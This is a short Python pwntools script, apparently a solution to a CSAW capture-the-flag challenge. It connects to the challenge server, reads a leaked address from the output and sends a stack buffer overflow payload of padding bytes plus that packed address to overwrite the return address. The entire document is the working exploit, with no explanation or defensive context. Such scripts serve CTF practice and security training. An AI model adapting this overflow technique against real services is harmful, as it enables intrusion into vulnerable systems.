from pwn import *

r = remote('pwn.chal.csaw.io', 8000)

msg = r.recv()
lines = msg.split('\n')
address = int(lines[1][4:],16)

r.sendline("A" * (0x40 + 8) + p64(address))
print(r.recv())
